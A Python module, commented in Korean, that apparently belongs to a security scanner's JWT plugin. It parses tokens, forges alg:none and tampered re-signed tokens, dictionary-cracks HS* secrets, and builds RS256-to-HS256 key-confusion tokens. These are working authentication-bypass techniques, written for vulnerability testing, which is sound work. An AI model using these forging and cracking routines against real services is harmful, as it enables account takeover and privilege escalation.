"""JWT 토큰 분석기 - 파싱, 변조 토큰 생성, HS256 크래킹"""
import base64
import hashlib
import hmac
import json
import re
import time
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

from s2n.s2nscanner.plugins.jwt.jwt_constants import (
    ALG_NONE_VARIANTS,
    HS_ALGORITHMS,
    SENSITIVE_CLAIM_KEYS,
    PRIVILEGE_CLAIM_KEYS,
    SECRET_CRACK_TIMEOUT,
)
from s2n.s2nscanner.logger import get_logger

logger = get_logger("plugins.jwt.analyzer")


# =============================================================================
# 데이터 클래스
# =============================================================================

@dataclass
class JWTToken:
    """파싱된 JWT 토큰"""
    raw: str
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: str
    algorithm: str
    source: str  # "auth_header" | "cookie" | "response_body" | "unknown"


# =============================================================================
# Base64URL 유틸리티
# =============================================================================

def _b64url_decode(s: str) -> bytes:
    """Base64URL → bytes (패딩 자동 추가)"""
    s = s.replace("-", "+").replace("_", "/")
    padding = (4 - len(s) % 4) % 4
    return base64.b64decode(s + "=" * padding)


def _b64url_encode(data: bytes) -> str:
    """bytes → Base64URL (패딩 제거)"""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _json_b64(obj: Dict) -> str:
    """딕셔너리를 JSON 직렬화 후 Base64URL 인코딩"""
    return _b64url_encode(json.dumps(obj, separators=(",", ":")).encode("utf-8"))


def _alg_to_hashlib(alg: str) -> Optional[Any]:
    """HS* 알고리즘명 → hashlib 해시 함수"""
    mapping: Dict[str, Any] = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    return mapping.get(alg.upper())


def _mask_value(value: str) -> str:
    """민감 값 마스킹 (앞 2자 + *** + 뒤 2자)"""
    if len(value) <= 4:
        return "****"
    return value[:2] + "*" * (len(value) - 4) + value[-2:]


# =============================================================================
# JWTAnalyzer
# =============================================================================

class JWTAnalyzer:
    """JWT 토큰 파싱, 변조 토큰 생성, HS256 크래킹을 담당합니다."""

    def parse(self, raw_token: str, source: str = "unknown") -> Optional[JWTToken]:
        """raw JWT 문자열을 JWTToken 객체로 파싱합니다."""
        parts = raw_token.strip().split(".")
        if len(parts) != 3:
            logger.debug(f"JWT 파싱 실패: 파트 수 {len(parts)} (기대값: 3)")
            return None
        try:
            header = json.loads(_b64url_decode(parts[0]))
            payload = json.loads(_b64url_decode(parts[1]))
        except Exception as exc:
            logger.debug(f"JWT 파싱 예외: {exc}")
            return None

        return JWTToken(
            raw=raw_token.strip(),
            header=header,
            payload=payload,
            signature=parts[2],
            algorithm=header.get("alg", "unknown"),
            source=source,
        )

    # ------------------------------------------------------------------
    # Algorithm None 공격용 토큰 생성
    # ------------------------------------------------------------------

    def build_none_alg_tokens(self, token: JWTToken) -> List[str]:
        """alg:none 변형 토큰 목록 생성 (서명 없는 형태)"""
        tokens: List[str] = []
        for variant in ALG_NONE_VARIANTS:
            new_header = dict(token.header)
            new_header["alg"] = variant
            header_b64 = _json_b64(new_header)
            payload_b64 = _json_b64(token.payload)
            # 서명 파트를 빈 문자열로: "header.payload."
            tokens.append(f"{header_b64}.{payload_b64}.")
        return tokens

    # ------------------------------------------------------------------
    # HS* 서명 관련
    # ------------------------------------------------------------------

    def crack_hs256_secret(
        self, token: JWTToken, secrets: List[str]
    ) -> Optional[str]:
        """
        HS256/HS384/HS512 서명을 사전 공격으로 크래킹합니다 (오프라인).

        Args:
            token: 분석 대상 JWT
            secrets: 시크릿 후보 목록

        Returns:
            크래킹 성공 시 시크릿 문자열, 실패/타임아웃 시 None
        """
        if token.algorithm.upper() not in HS_ALGORITHMS:
            return None

        hash_func = _alg_to_hashlib(token.algorithm)
        if hash_func is None:
            return None

        parts = token.raw.split(".")
        if len(parts) != 3 or not parts[2]:
            return None  # 서명이 없으면 크래킹 의미 없음

        msg = f"{parts[0]}.{parts[1]}".encode("ascii")
        try:
            expected_sig = _b64url_decode(parts[2])
        except Exception:
            return None

        deadline = time.monotonic() + SECRET_CRACK_TIMEOUT
        for secret in secrets:
            if time.monotonic() > deadline:
                logger.debug("[JWTAnalyzer] HS256 크래킹 타임아웃")
                break
            try:
                computed = hmac.new(
                    secret.encode("utf-8"), msg, hash_func
                ).digest()
                if hmac.compare_digest(computed, expected_sig):
                    return secret
            except Exception:
                continue
        return None

    def sign_hs_token(
        self,
        header: Dict[str, Any],
        payload: Dict[str, Any],
        secret: str,
        algorithm: str = "HS256",
    ) -> Optional[str]:
        """HS* 알고리즘으로 서명된 JWT 토큰을 생성합니다."""
        hash_func = _alg_to_hashlib(algorithm)
        if hash_func is None:
            return None
        try:
            header_b64 = _json_b64(header)
            payload_b64 = _json_b64(payload)
            msg = f"{header_b64}.{payload_b64}".encode("ascii")
            sig = hmac.new(secret.encode("utf-8"), msg, hash_func).digest()
            return f"{header_b64}.{payload_b64}.{_b64url_encode(sig)}"
        except Exception as exc:
            logger.debug(f"[JWTAnalyzer] HS 토큰 서명 실패: {exc}")
            return None

    def build_tampered_hs_token(
        self,
        token: JWTToken,
        secret: str,
        payload_changes: Dict[str, Any],
    ) -> Optional[str]:
        """기존 토큰의 페이로드를 수정 후 HS* 재서명한 토큰을 반환합니다."""
        new_payload = dict(token.payload)
        new_payload.update(payload_changes)
        return self.sign_hs_token(token.header, new_payload, secret, token.algorithm)

    def build_tampered_none_token(
        self, token: JWTToken, payload_changes: Dict[str, Any]
    ) -> str:
        """alg:none 방식으로 페이로드를 수정한 서명 없는 토큰을 반환합니다."""
        new_header = dict(token.header)
        new_header["alg"] = "none"
        new_payload = dict(token.payload)
        new_payload.update(payload_changes)
        header_b64 = _json_b64(new_header)
        payload_b64 = _json_b64(new_payload)
        return f"{header_b64}.{payload_b64}."

    def build_hs256_downgrade_token(
        self, token: JWTToken, public_key_pem: str
    ) -> Optional[str]:
        """
        RS256 → HS256 다운그레이드 토큰 생성.
        서버의 RSA 공개키(PEM)를 HMAC 시크릿으로 사용합니다.
        """
        new_header = dict(token.header)
        new_header["alg"] = "HS256"
        new_header.pop("kid", None)  # kid 제거 (키 조회 경로 우회)
        return self.sign_hs_token(new_header, token.payload, public_key_pem, "HS256")

    # ------------------------------------------------------------------
    # 클레임 분석
    # ------------------------------------------------------------------

    def find_sensitive_claims(
        self, token: JWTToken
    ) -> List[Tuple[str, str]]:
        """
        페이로드에서 민감 데이터 클레임을 탐지합니다.

        Returns:
            [(claim_key, masked_value), ...] 형태의 목록
        """
        results: List[Tuple[str, str]] = []
        email_re = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
        phone_re = re.compile(r"^\+?[0-9]{10,15}$")
        id_number_re = re.compile(r"^[0-9]{13,14}$")  # 주민번호 등

        for key, value in token.payload.items():
            is_sensitive = False
            key_lower = key.lower()

            # 1) 키 기반 탐지
            if any(s in key_lower for s in SENSITIVE_CLAIM_KEYS):
                is_sensitive = True

            # 2) 값 패턴 기반 탐지 (문자열인 경우만)
            if not is_sensitive and isinstance(value, str):
                clean = value.replace("-", "").replace(" ", "")
                if email_re.match(value) and key_lower not in ("email", "sub", "iss", "aud"):
                    is_sensitive = True
                elif phone_re.match(clean):
                    is_sensitive = True
                elif id_number_re.match(clean):
                    is_sensitive = True

            if is_sensitive:
                results.append((key, _mask_value(str(value))))

        return results

    def find_privilege_claims(
        self, token: JWTToken
    ) -> Dict[str, Any]:
        """페이로드에서 권한 관련 클레임을 탐지하여 반환합니다."""
        result: Dict[str, Any] = {}
        for key, value in token.payload.items():
            key_lower = key.lower()
            if key_lower in PRIVILEGE_CLAIM_KEYS or any(
                priv in key_lower for priv in PRIVILEGE_CLAIM_KEYS
            ):
                result[key] = value
        return result
